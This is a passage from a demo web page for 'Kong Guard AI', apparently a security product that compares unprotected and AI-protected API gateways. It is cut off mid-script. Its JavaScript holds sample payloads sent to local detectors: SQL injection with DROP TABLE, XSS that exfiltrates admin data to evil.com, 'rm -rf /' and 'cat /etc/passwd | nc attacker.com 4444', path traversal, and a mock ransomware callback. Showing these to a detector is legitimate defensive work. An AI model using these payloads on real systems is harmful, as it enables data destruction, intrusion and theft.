<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kong Guard AI - Enterprise Three-Tier Demo</title>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="kongguard.css">
    <style>
        /* Enterprise demo specific overrides */
        .demo-container {
            padding: 16px;
        }

        .demo-header {
            background: radial-gradient(80% 120% at 50% 0%, #13161a 0%, #0f1113 70%);
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 24px;
            text-align: center;
            margin-bottom: 20px;
        }

        .demo-header h1 {
            font-family: "Rajdhani", Inter, sans-serif;
            font-weight: 600;
            font-size: 2.8em;
            color: var(--hi-silver);
            margin-bottom: 12px;
            letter-spacing: .04em;
        }

        .demo-header p {
            font-size: 1.1em;
            color: var(--txt-muted);
            margin: 0;
        }

        .protection-tiers {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 16px;
            margin-bottom: 20px;
        }

        .tier {
            background: linear-gradient(180deg, var(--surface), var(--surface-2));
            border: 2px solid var(--line);
            border-radius: var(--radius);
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .tier.unprotected {
            border-color: var(--critical);
            background: linear-gradient(180deg, #1a1214, #151012);
        }

        .tier.cloud {
            border-color: var(--steel);
            background: linear-gradient(180deg, #141a1f, #0f1519);
        }

        .tier.local {
            border-color: var(--normal);
            background: linear-gradient(180deg, #151a17, #101512);
        }

        .tier h3 {
            font-family: "Rajdhani", Inter, sans-serif;
            font-weight: 600;
            font-size: 1.4em;
            color: var(--hi-silver);
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: .04em;
        }

        .tier-icon {
            font-size: 1.6em;
        }

        .tier-metrics {
            margin-top: 16px;
            padding: 12px;
            background: #13171c;
            border: 1px solid var(--line);
            border-radius: var(--radius);
        }

        .metric-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 6px;
            font-size: 0.85em;
        }

        .metric-row:last-child {
            margin-bottom: 0;
        }

        .metric-label {
            color: var(--txt-muted);
        }

        .metric-value {
            color: var(--hi-silver);
            font-weight: 600;
        }

        .attacks-section {
            background: linear-gradient(180deg, var(--surface), var(--surface-2));
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 20px;
            margin-bottom: 20px;
        }

        .attacks-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 16px;
            margin-top: 16px;
        }

        .attack-card {
            background: #13171c;
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 16px;
        }

        .attack-title {
            font-family: "Rajdhani", Inter, sans-serif;
            font-size: 1.2em;
            font-weight: 600;
            color: var(--hi-silver);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            letter-spacing: .04em;
        }

        .attack-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 6px;
            margin-bottom: 12px;
        }

        .attack-btn {
            padding: 8px 12px;
            border-radius: var(--radius);
            border: 1px solid var(--line);
            color: var(--txt);
            background: #15191d;
            cursor: pointer;
            font-size: 0.75em;
            font-weight: 500;
            transition: all 0.2s ease;
            text-align: center;
        }

        .attack-btn:hover {
            border-color: var(--steel);
            color: var(--hi-silver);
            background: var(--surface);
        }

        .attack-btn.unprotected {
            border-left: 3px solid var(--critical);
        }

        .attack-btn.cloud {
            border-left: 3px solid var(--steel);
        }

        .attack-btn.local {
            border-left: 3px solid var(--normal);
        }

        .attack-result {
            min-height: 60px;
            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            font-size: 0.85em;
            line-height: 1.4;
        }

        .result-blocked {
            border-left: 4px solid #ff4444;
        }

        .result-allowed {
            border-left: 4px solid #44ff44;
        }

        .result-monitored {
            border-left: 4px solid #ffaa44;
        }

        .thinking {
            display: none;
            text-align: center;
            padding: 20px;
            font-style: italic;
            opacity: 0.7;
        }

        .comparison-section {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
        }

        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .comparison-table th,
        .comparison-table td {
            padding: 12px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .comparison-table th {
            background: rgba(255,255,255,0.1);
            font-weight: bold;
        }

        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-connected { background: #44ff44; }
        .status-disconnected { background: #ff4444; }
        .status-degraded { background: #ffaa44; }

        .narration {
            background: rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #44aaff;
            font-size: 1.1em;
            line-height: 1.6;
            display: none;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(0,0,0,0.3);
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #44aaff, #44ff44);
            width: 0%;
            transition: width 0.5s ease;
        }

        @media (max-width: 1200px) {
            .protection-tiers {
                grid-template-columns: 1fr;
                gap: 20px;
            }

            .attacks-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body class="demo-container">
    <div class="demo-header">
        <div class="demo-brand" style="display: flex; align-items: center; gap: 15px; justify-content: center;">
            <img src="kong-guard-ai/branding/KongGuardAI Logo.webp" alt="Kong Guard AI" style="height: 48px; width: auto; object-fit: contain; filter: brightness(0.95);" onerror="this.style.display='none'">
            <h1>Kong Guard AI</h1>
        </div>
        <p>Enterprise Three-Tier Protection Demonstration</p>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
    </div>

    <!-- Attack Flood Control Panel -->
    <div class="attack-control-panel" style="background: linear-gradient(180deg, var(--surface), var(--bg)); border: 1px solid var(--critical); border-radius: var(--radius); padding: 20px; margin-bottom: 20px;">
        <h2 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--critical); margin-bottom: 16px; text-align: center;">PENETRATION TESTING CONTROL</h2>
        
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 16px;">
            <div>
                <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Attack Intensity</label>
                <select id="attackIntensity" style="width: 100%; padding: 8px; background: var(--surface); color: var(--hi-silver); border: 1px solid var(--line); border-radius: 4px; font-size: 14px;">
                    <option value="low">Low Intensity (10 req/s)</option>
                    <option value="medium" selected>Medium Intensity (50 req/s)</option>
                    <option value="high">High Intensity (200 req/s)</option>
                    <option value="extreme">EXTREME (1000+ req/s)</option>
                </select>
            </div>
            
            <div>
                <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Attack Strategy</label>
                <select id="attackStrategy" style="width: 100%; padding: 8px; background: var(--surface); color: var(--hi-silver); border: 1px solid var(--line); border-radius: 4px; font-size: 14px;">
                    <option value="sustained" selected>Sustained Pressure</option>
                    <option value="wave">Wave Attacks</option>
                    <option value="stealth">Stealth Mode</option>
                    <option value="blended">Blended Traffic</option>
                    <option value="escalation">Escalation Mode</option>
                </select>
            </div>
            
            <div>
                <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Duration (seconds)</label>
                <input type="number" id="attackDuration" value="60" min="10" max="300" style="width: 100%; padding: 8px; background: var(--surface); color: var(--hi-silver); border: 1px solid var(--line); border-radius: 4px; font-size: 14px;">
            </div>
            
            <div style="display: flex; align-items: end; gap: 8px;">
                <button onclick="launchAttackFlood()" id="launchFloodBtn" style="flex: 1; padding: 12px; background: var(--critical); color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; text-transform: uppercase; cursor: pointer; transition: all 0.2s;">
                    LAUNCH ATTACK FLOOD
                </button>
                <button onclick="stopAttackFlood()" id="stopFloodBtn" style="flex: 1; padding: 12px; background: var(--steel); color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; text-transform: uppercase; cursor: pointer; transition: all 0.2s;" disabled>
                    STOP ATTACK
                </button>
            </div>
        </div>
        
        <!-- Attack Status Display -->
        <div class="attack-status" style="background: #0f1113; border: 1px solid var(--line); border-radius: var(--radius); padding: 16px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                <h3 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--hi-silver); margin: 0; font-size: 1.1em;">Attack Status</h3>
                <div id="attackStatusBadge" style="display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; background: var(--line); color: var(--txt-muted);">READY</div>
            </div>
            
            <div id="attackProgress" style="color: var(--txt-muted); font-size: 14px; line-height: 1.4; margin-bottom: 12px;">
                Ready to launch penetration testing attack flood...
            </div>
            
            <!-- Real-time Attack Metrics -->
            <div class="live-attack-metrics" style="display: none;" id="liveAttackMetrics">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 8px; margin-top: 12px;">
                    <div style="text-align: center; padding: 8px; background: var(--surface-2); border-radius: 4px;">
                        <div style="color: var(--txt-muted); font-size: 10px; text-transform: uppercase;">Attacks/sec</div>
                        <div id="attacksPerSec" style="color: var(--critical); font-weight: 600; font-size: 16px;">0</div>
                    </div>
                    <div style="text-align: center; padding: 8px; background: var(--surface-2); border-radius: 4px;">
                        <div style="color: var(--txt-muted); font-size: 10px; text-transform: uppercase;">Block Rate</div>
                        <div id="blockRate" style="color: var(--caution); font-weight: 600; font-size: 16px;">0%</div>
                    </div>
                    <div style="text-align: center; padding: 8px; background: var(--surface-2); border-radius: 4px;">
                        <div style="color: var(--txt-muted); font-size: 10px; text-transform: uppercase;">Avg Response</div>
                        <div id="avgFloodResponse" style="color: var(--normal); font-weight: 600; font-size: 16px;">0ms</div>
                    </div>
                    <div style="text-align: center; padding: 8px; background: var(--surface-2); border-radius: 4px;">
                        <div style="color: var(--txt-muted); font-size: 10px; text-transform: uppercase;">Total Sent</div>
                        <div id="totalAttacksSent" style="color: var(--steel); font-weight: 600; font-size: 16px;">0</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Real-time Metrics Dashboard -->
    <div class="metrics-dashboard" style="background: linear-gradient(180deg, var(--surface), var(--surface-2)); border: 1px solid var(--line); border-radius: var(--radius); padding: 20px; margin-bottom: 20px;">
        <h2 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--hi-silver); margin-bottom: 16px; text-align: center;">Real-Time Security Metrics</h2>
        
        <div class="global-metrics" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px;">
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Total Analyzed</div>
                <div id="globalTotalAnalyzed" style="color: var(--hi-silver); font-weight: 600; font-size: 20px;">0</div>
            </div>
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Threats Blocked</div>
                <div id="globalThreatsBlocked" style="color: var(--critical); font-weight: 600; font-size: 20px;">0</div>
            </div>
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Avg Confidence</div>
                <div id="globalAvgConfidence" style="color: var(--steel); font-weight: 600; font-size: 20px;">0%</div>
            </div>
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Avg Processing</div>
                <div id="globalAvgProcessing" style="color: var(--caution); font-weight: 600; font-size: 20px;">0ms</div>
            </div>
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Detection Rate</div>
                <div id="globalDetectionRate" style="color: var(--normal); font-weight: 600; font-size: 20px;">0%</div>
            </div>
            <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Vulnerabilities</div>
                <div id="globalVulnerabilities" style="color: var(--caution); font-weight: 600; font-size: 20px;">0</div>
            </div>
        </div>

        <!-- Live Analysis Status -->
        <div class="live-analysis-section" style="background: #0f1113; border: 1px solid var(--line); border-radius: var(--radius); padding: 16px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                <h3 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--hi-silver); margin: 0; font-size: 1.1em;">Live Analysis Status</h3>
                <div id="analysisStatus" style="display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; background: var(--line); color: var(--txt-muted);">READY</div>
            </div>
            <div id="currentAnalysisDetails" style="color: var(--txt-muted); font-size: 14px; line-height: 1.4;">Ready to analyze threats across all three protection tiers...</div>
            
            <!-- Recent Activity Log -->
            <div class="activity-log" style="margin-top: 12px; max-height: 120px; overflow-y: auto;">
                <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px;">Recent Activity</div>
                <div id="activityLog" style="font-size: 12px; color: var(--txt); line-height: 1.3;">
                    <div style="opacity: 0.6; font-style: italic;">No recent activity...</div>
                </div>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="protection-tiers">
        <div class="tier unprotected">
            <h3>Unprotected Kong Gateway</h3>
            <p>Raw Kong Gateway</p>
            <p>No AI Protection</p>
            <div class="tier-metrics">
                <div class="metric-row">
                    <span>Status:</span>
                    <span class="metric-value"><span class="status-indicator status-connected"></span>Online</span>
                </div>
                <div class="metric-row">
                    <span>Requests Processed:</span>
                    <span class="metric-value" id="unprotected-total">0</span>
                </div>
                <div class="metric-row">
                    <span>Attacks Blocked:</span>
                    <span class="metric-value" id="unprotected-blocked">0</span>
                </div>
                <div class="metric-row">
                    <span>Vulnerabilities:</span>
                    <span class="metric-value" style="color: #ff6666;" id="unprotected-vulnerable">0</span>
                </div>
                <div class="metric-row">
                    <span>Success Rate:</span>
                    <span class="metric-value" style="color: #ff6666;" id="unprotected-success">0%</span>
                </div>
                <div class="metric-row">
                    <span>Avg Response:</span>
                    <span class="metric-value" id="unprotected-response">~2ms</span>
                </div>
            </div>
        </div>

        <div class="tier cloud">
            <h3>Cloud AI Protection</h3>
            <p>Kong + Guard AI</p>
            <p>Gemini/GPT Analysis</p>
            <div class="tier-metrics">
                <div class="metric-row">
                    <span>Status:</span>
                    <span class="metric-value"><span class="status-indicator" id="cloud-status"></span><span id="cloud-status-text">Checking...</span></span>
                </div>
                <div class="metric-row">
                    <span>Requests Processed:</span>
                    <span class="metric-value" id="cloud-total">0</span>
                </div>
                <div class="metric-row">
                    <span>Attacks Blocked:</span>
                    <span class="metric-value" id="cloud-blocked">0</span>
                </div>
                <div class="metric-row">
                    <span>Detection Rate:</span>
                    <span class="metric-value" style="color: #66ff66;" id="cloud-detection">0%</span>
                </div>
                <div class="metric-row">
                    <span>Avg Confidence:</span>
                    <span class="metric-value" style="color: #66ff66;" id="cloud-confidence">0%</span>
                </div>
                <div class="metric-row">
                    <span>Avg Response:</span>
                    <span class="metric-value" id="cloud-response">~250ms</span>
                </div>
            </div>
        </div>

        <div class="tier local">
            <h3>Local AI Protection (Ollama)</h3>
            <p>Kong + Guard AI</p>
            <p>Private Mistral/Llama</p>
            <div class="tier-metrics">
                <div class="metric-row">
                    <span>Status:</span>
                    <span class="metric-value"><span class="status-indicator" id="local-status"></span><span id="local-status-text">Checking...</span></span>
                </div>
                <div class="metric-row">
                    <span>Requests Processed:</span>
                    <span class="metric-value" id="local-total">0</span>
                </div>
                <div class="metric-row">
                    <span>Attacks Blocked:</span>
                    <span class="metric-value" id="local-blocked">0</span>
                </div>
                <div class="metric-row">
                    <span>Detection Rate:</span>
                    <span class="metric-value" style="color: #66ff66;" id="local-detection">0%</span>
                </div>
                <div class="metric-row">
                    <span>Avg Confidence:</span>
                    <span class="metric-value" style="color: #66ff66;" id="local-confidence">0%</span>
                </div>
                <div class="metric-row">
                    <span>Avg Response:</span>
                    <span class="metric-value" id="local-response">~45ms</span>
                </div>
            </div>
        </div>
    </div>

    <div class="narration" id="narration">
        <strong>Demo Narration:</strong> <span id="narrationText">Welcome to Kong Guard AI enterprise demonstration...</span>
    </div>

    <div class="attacks-section">
        <h2>Enterprise Attack Scenarios</h2>
        <p>Click any attack type to compare all three protection levels simultaneously</p>

        <div class="attacks-grid">
            <div class="attack-card">
                <div class="attack-title">SQL Injection</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('sql', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('sql', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('sql', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="sql-result">Ready to test SQL injection attacks...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">XSS Attack</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('xss', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('xss', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('xss', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="xss-result">Ready to test XSS attacks...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">Command Injection</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('cmd_injection', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('cmd_injection', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('cmd_injection', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="cmd_injection-result">Ready to test command injection...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">Path Traversal</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('path', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('path', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('path', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="path-result">Ready to test path traversal...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">LDAP Injection</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('ldap_injection', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('ldap_injection', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('ldap_injection', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="ldap_injection-result">Ready to test LDAP injection...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">Business Logic Attack</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('business_logic', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('business_logic', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('business_logic', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="business_logic-result">Ready to test business logic attacks...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">Ransomware C2</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('ransomware', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('ransomware', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('ransomware', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="ransomware-result">Ready to test ransomware C2...</div>
            </div>

            <div class="attack-card">
                <div class="attack-title">Normal Traffic</div>
                <div class="attack-buttons">
                    <button class="attack-btn btn-unprotected" onclick="testAttack('normal', 'unprotected')">Unprotected</button>
                    <button class="attack-btn btn-cloud" onclick="testAttack('normal', 'cloud')">Cloud AI</button>
                    <button class="attack-btn btn-local" onclick="testAttack('normal', 'local')">Local AI</button>
                </div>
                <div class="attack-result" id="normal-result">Ready to test normal traffic...</div>
            </div>
        </div>
    </div>

    <div class="comparison-section">
        <h2>Live Comparison Matrix</h2>
        <table class="comparison-table">
            <thead>
                <tr>
                    <th>Attack Type</th>
                    <th>Unprotected</th>
                    <th>Cloud AI</th>
                    <th>Local AI</th>
                </tr>
            </thead>
            <tbody id="comparisonTableBody">
                <tr>
                    <td colspan="4" style="padding: 20px; opacity: 0.6;">
                        Click attack buttons above to populate comparison data...
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <div class="thinking" id="thinking">
        <div>AI is analyzing the attack pattern...</div>
    </div>

    <script>
        // Service endpoints
        const services = {
            unprotected: 'http://localhost:8000',  // Direct Kong without Guard AI
            cloud: 'http://localhost:18002',       // Kong Guard AI with cloud
            local: 'http://localhost:18003'        // Kong Guard AI with Ollama
        };

        // Enhanced metrics tracking
        let metrics = {
            unprotected: { 
                blocked: 0, 
                vulnerable: 0, 
                total: 0, 
                totalTime: 0, 
                totalConfidence: 0,
                successRate: 0
            },
            cloud: { 
                blocked: 0, 
                vulnerable: 0, 
                total: 0, 
                totalTime: 0, 
                totalConfidence: 0,
                detectionRate: 0
            },
            local: { 
                blocked: 0, 
                vulnerable: 0, 
                total: 0, 
                totalTime: 0, 
                totalConfidence: 0,
                detectionRate: 0
            }
        };

        // Activity log tracking
        let activityLog = [];

        function addToActivityLog(tier, attackType, result, blocked = false) {
            const timestamp = new Date().toLocaleTimeString();
            const status = blocked ? 'BLOCKED' : (result.threat_score > 0.3 ? 'DETECTED' : 'ALLOWED');
            const entry = `[${timestamp}] ${tier.toUpperCase()}: ${attackType.toUpperCase()} - ${status} (${(result.threat_score * 100).toFixed(0)}%)`;
            
            activityLog.unshift(entry);
            if (activityLog.length > 10) activityLog.pop(); // Keep only last 10 entries
            
            const logElement = document.getElementById('activityLog');
            logElement.innerHTML = activityLog.map(entry => `<div style="margin-bottom: 2px; opacity: 0.9;">${entry}</div>`).join('');
        }

        // Attack patterns
        const attacks = {
            sql: {
                name: "SQL Injection",
                query: "id=1' OR '1'='1; DROP TABLE users;--",
                path: "/api/users",
                method: "GET",
                body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--",
                narration: "This SQL injection attempts to bypass authentication and extract sensitive data from the database."
            },
            xss: {
                name: "Cross-Site Scripting",
                query: "&lt;script&gt;alert('XSS');&lt;/script&gt;",
                path: "/comment",
                method: "POST", 
                body: "&lt;script&gt;fetch('/admin/users').then(r=&gt;r.text()).then(d=&gt;fetch('//evil.com/?'+btoa(d)))&lt;/script&gt;",
                narration: "This XSS attack attempts to steal user data and send it to an attacker-controlled server."
            },
            cmd_injection: {
                name: "Command Injection",
                query: "ping=127.0.0.1; rm -rf / #",
                path: "/api/ping",
                method: "POST",
                body: "; cat /etc/passwd | nc attacker.com 4444 &",
                narration: "This command injection could execute arbitrary system commands on the server."
            },
            path: {
                name: "Path Traversal",
                query: "file=../../../../etc/passwd",
                path: "/download",
                method: "GET",
                body: "",
                narration: "This path traversal attack attempts to access sensitive system files outside the web root."
            },
            ldap_injection: {
                name: "LDAP Injection",
                query: "user=admin')(&(password=*))",
                path: "/auth/ldap",
                method: "POST",
                body: "admin')(&(password=*)(|(objectClass=*))",
                narration: "This LDAP injection attempts to bypass authentication by manipulating LDAP queries."
            },
            business_logic: {
                name: "Business Logic Attack",
                query: "amount=-999999&to_account=attacker",
                path: "/api/transfer",
                method: "POST",
                body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}',
                narration: "This business logic attack exploits negative amounts to potentially steal millions from bank reserves."
            },
            ransomware: {
                name: "Ransomware C2",
                query: "host_id=VICTIM-001&status=encrypted",
                path: "/api/callback",
                method: "POST",
                body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}',
                narration: "This ransomware command & control communication indicates a successful system encryption demanding $50M ransom."
            },
            normal: {
                name: "Normal Traffic",
                query: "page=1&limit=10&sort=date",
                path: "/api/products",
                method: "GET",
                body: "",
                narration: "This represents normal, legitimate user traffic that should be allowed through."
            }
        };

        // Initialize dashboard
        async function initializeDashboard() {
            showNarration("Initializing Kong Guard AI enterprise demonstration. Checking service availability...");
            
            // Check service health
            await Promise.all([
                checkServiceHealth('cloud'),
                checkServiceHealth('local')
            ]);
            
            showNarration("All services ready. Click any attack type to see the three-tier protection comparison.");
            
            // Auto-start demo if in presentation mode
            if (window.location.search.includes('auto=true')) {
                setTimeout(() => runAutomaticDemo(), 2000);
            }
        }

        async function checkServiceHealth(serviceType) {
            try {
                const response = await fetch(`${services[serviceType]}/health`);
                const statusIndicator = document.getElementById(`${serviceType}-status`);
                const statusText = document.getElementById(`${serviceType}-status-text`);
                
                if (response.ok) {
                    statusIndicator.className = 'status-indicator status-connected';
                    statusText.textContent = 'Online';
                } else {
                    statusIndicator.className = 'status-indicator status-degraded';
                    statusText.textContent = 'Degraded';
                }
            } catch (error) {
                const statusIndicator = document.getElementById(`${serviceType}-status`);
                const statusText = document.getElementById(`${serviceType}-status-text`);
                statusIndicator.className = 'status-indicator status-disconnected';
                statusText.textContent = 'Offline';
            }
        }

        async function testAttack(attackType, tier) {
            const attack = attacks[attackType];
            const resultDiv = document.getElementById(`${attackType}-result`);
            
            showNarration(attack.narration);
            showThinking(true);
            
            resultDiv.innerHTML = '<div style="opacity: 0.6;">Analyzing...</div>';
            
            const startTime = performance.now();
            
            try {
                let result;
                
                if (tier === 'unprotected') {
                    // Simulate unprotected response (always allows)
                    await new Promise(resolve => setTimeout(resolve, 2)); // 2ms delay
                    result = {
                        threat_score: 0.0,
                        threat_type: "none", 
                        recommended_action: "allow",
                        reasoning: "No protection - request passed through unchanged",
                        processing_time: 0.002
                    };
                } else {
                    // Analyze with AI service
                    const response = await fetch(`${services[tier]}/analyze`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            features: {
                                method: attack.method,
                                path: attack.path,
                                client_ip: '203.0.113.100',
                                user_agent: 'DemoTester/1.0',
                                requests_per_minute: 10,
                                content_length: (attack.body || attack.query || '').length,
                                query_param_count: 1,
                                header_count: 3,
                                hour_of_day: new Date().getHours(),
                                query: attack.query,
                                body: attack.body || "",
                                headers: {}
                            },
                            context: { previous_requests: 0 }
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    
                    result = await response.json();
                }
                
                const processingTime = performance.now() - startTime;
                
                // Update metrics
                metrics[tier].total++;
                metrics[tier].totalTime += processingTime;
                
                // Update confidence tracking
                if (result.confidence !== undefined) {
                    metrics[tier].totalConfidence += result.confidence;
                } else if (result.threat_score !== undefined) {
                    metrics[tier].totalConfidence += result.threat_score;
                }
                
                const isBlocked = result.threat_score >= 0.7;
                if (isBlocked) {
                    metrics[tier].blocked++;
                } else if (tier === 'unprotected' && result.threat_score === 0) {
                    metrics[tier].vulnerable++;
                }
                
                // Add to activity log
                addToActivityLog(tier, attackType, result, isBlocked);
                
                // Update live analysis status
                updateLiveAnalysisStatus(tier, attackType, result, processingTime);
                
                // Display result
                displayResult(attackType, tier, result, processingTime);
                updateMetrics();
                updateComparisonTable(attackType, tier, result);
                
            } catch (error) {
                resultDiv.textContent = `ERROR: ${error.message}`;
            }
            
            showThinking(false);
        }

        function displayResult(attackType, tier, result, processingTime) {
            const resultDiv = document.getElementById(`${attackType}-result`);
            const action = result.recommended_action || 'unknown';
            const score = (result.threat_score * 100).toFixed(0);
            
            let statusIcon, statusText, statusClass;
            
            if (action === 'block' || result.threat_score >= 0.7) {
                statusIcon = '[BLOCKED]';
                statusText = 'BLOCKED';
                statusClass = 'result-blocked';
            } else if (action === 'monitor' || result.threat_score >= 0.3) {
                statusIcon = '[MONITOR]';
                statusText = 'MONITORED';
                statusClass = 'result-monitored';
            } else {
                statusIcon = tier === 'unprotected' ? '[VULNERABLE]' : '[ALLOWED]';
                statusText = tier === 'unprotected' ? 'VULNERABLE' : 'ALLOWED';
                statusClass = tier === 'unprotected' ? 'result-blocked' : 'result-allowed';
            }
            
            resultDiv.className = `attack-result ${statusClass}`;
            resultDiv.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <strong>${statusIcon} ${statusText}</strong>
                    <span style="font-size: 0.9em; opacity: 0.8;">${processingTime.toFixed(0)}ms</span>
                </div>
                <div style="margin-bottom: 5px;">
                    <strong>Threat:</strong> ${result.threat_type || 'none'} (${score}%)
                </div>
